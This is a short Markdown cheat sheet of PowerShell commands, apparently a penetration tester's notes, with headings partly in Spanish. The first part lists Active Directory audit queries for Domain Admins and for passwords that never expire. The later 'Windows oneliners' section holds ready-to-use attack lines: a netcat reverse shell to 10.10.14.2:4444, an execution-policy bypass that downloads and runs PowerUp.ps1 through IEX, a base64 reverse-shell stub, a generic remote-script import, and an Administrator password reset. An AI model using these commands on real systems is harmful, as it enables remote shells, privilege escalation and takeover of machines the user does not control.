# Powershell Commands

## AD

### Cuentas genericas como administradores de Dominio

```powershell
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Get-ADUser -Properties samaccountname, Name, Enabled | Select-Object samaccountname, Name, Enabled
```

## Cuentas de administradores de dominio no cumplen con las mejores practicas

```powershell
Get-ADGroupMember -Identity "Domain Admins" | Get-ADUser -Properties samaccountname, Name, PasswordLastSet, PasswordNeverExpires, Enabled | Select-Object samaccountname, Name, PasswordLastSet, PasswordNeverExpires, Enabled
```


### Contrasenas de usuarios de dominio que no expiran y estan habilitadas

```powershell
Get-ADGroupMember -Identity "Domain Users" | Get-ADUser -Properties samaccountname, Name, Enabled, PasswordNeverExpires | Select-Object samaccountname, Name, Enabled, PasswordNeverExpires | Export-Csv -Path .\users_expirepass.csv -NoTypeInformation 
```

## Windows oneliners

### Ping network

```powershell
1..254 | ForEach-Object { $ip = "192.168.110.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { Write-Host "IP: $ip is Up" } }
```

### Search file

```powershell
Get-ChildItem -Path C:\ -Filter "file.ext" -Recurse -ErrorAction SilentlyContinue
```

### Change Password of Administrator

```powershell
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Password" -Force)
```

### Start Process

```powershell
Start-Process powershell -Verb runAs "\\10.10.14.2\share\nc.exe -e powershell 10.10.14.2 4444"
```

### Powershell bypass

```powershell
powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1'); Invoke-AllChecks”
```

### Shell base64

```powershell
# https://www.revshells.com/ -> Powershell #3 (Base64)
powershell.exe -e <base64 here>
```

### Import Powershell HTTP

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:80/script.ps1')
```